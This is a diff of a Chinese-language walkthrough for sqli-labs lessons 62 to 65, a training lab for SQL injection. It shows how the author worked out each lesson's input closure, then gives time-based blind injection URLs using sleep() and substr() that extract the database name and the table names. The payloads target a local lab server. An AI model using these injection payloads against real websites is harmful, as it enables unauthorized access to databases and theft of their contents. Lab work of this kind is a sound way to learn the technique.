@@ -1646,435 +1646,100 @@ http://192.168.220.12/sqli/Less-61/?id=1%27))%20and%20updatexml(1,concat(%27~%27
 
 改一下，表名就好了。。
 
-## 62. 
+## 62. union select 和 报错都不行的挑战
 
+* 查看闭合方式
 
+![image](https://user-images.githubusercontent.com/76896357/115132468-f2f6c680-a032-11eb-89c3-0007376a6510.png)
 
+‘)的闭合方式
 
+* 看一下有没有回显
 
+![image](https://user-images.githubusercontent.com/76896357/115132480-2fc2bd80-a033-11eb-8d72-62a55251e173.png)
 
+没有回显
 
+* 查看能不能报错注入
 
+![image](https://user-images.githubusercontent.com/76896357/115132493-68629700-a033-11eb-95b3-350f0e8a8c5a.png)
 
+好家伙，报错也不行
 
+* bool盲注也没有区分，
 
+![image](https://user-images.githubusercontent.com/76896357/115132509-8fb96400-a033-11eb-964e-6fa41f9cffc4.png)
 
 
+*没办法，，让他睡觉吧
 
+* 延时注入
+```
+http://192.168.220.12/sqli/Less-62/?id=1%27)%20and%20length(database())%3E5%20and%20if(1=1,sleep(2),1)%20--+
+```
 
+![image](https://user-images.githubusercontent.com/76896357/115132538-c7c0a700-a033-11eb-9798-d2bf7616c211.png)
 
+那么就开是愉快的爆破吧
 
+* 查库
+```
+http://192.168.220.12/sqli/Less-62/?id=1%27)%20and%20substr(database(),1,1)=%27c%27%20and%20if(1=1,sleep(2),1)%20--+//就挑时间长的
+```
 
+![image](https://user-images.githubusercontent.com/76896357/115132893-b6c56500-a036-11eb-9f32-31ef57e00709.png)
 
+* 查表
 
+```
+192.168.220.12/sqli/Less-62/?id=1') and substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1)='c' and if(1=1,sleep(2),1) --+
+```
 
+![image](https://user-images.githubusercontent.com/76896357/115133250-5683f280-a039-11eb-8f8f-c3d803a06d32.png)
 
+由于次数的限制只能报出一部分，多试几次吧
 
+。。。
 
+## 63. ''挑战
 
+闭合方式是''
 
+直接延时吧
 
+```
+http://192.168.220.12/sqli/Less-63/index.php?id=1%27%20and%20substr(database(),1,1)=%27c%27%20and%20if(1=1,sleep(3),1)%20--+
+```
+![image](https://user-images.githubusercontent.com/76896357/115133299-bbd7e380-a039-11eb-8119-0ca9b770bdc2.png)
 
+## 64. ）)方式
+* 闭合方式没猜到，
 
+![image](https://user-images.githubusercontent.com/76896357/115133360-26891f00-a03a-11eb-9652-6de4707b8d98.png)
 
+好损啊，
 
+* 同样存在延时注入
 
+![image](https://user-images.githubusercontent.com/76896357/115133369-3bfe4900-a03a-11eb-985d-78ce31fd94d3.png)
 
+## 65. )的闭合方式
 
+* 猜测闭合方式
 
+![image](https://user-images.githubusercontent.com/76896357/115133398-7cf65d80-a03a-11eb-84a7-578e743431f1.png)
 
+）的闭合方式
 
+* 看看能不能延时注入
 
+千万注意这个小坑，虽然没啥影响，但也是人家的一种思路
 
+![image](https://user-images.githubusercontent.com/76896357/115133635-694bf680-a03c-11eb-83af-8b86eeef147e.png)
 
+可以延时了。。。
 
+![image](https://user-images.githubusercontent.com/76896357/115133624-5c2f0780-a03c-11eb-9ae8-8c99d7d3fcaf.png)
 
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+OK！！！
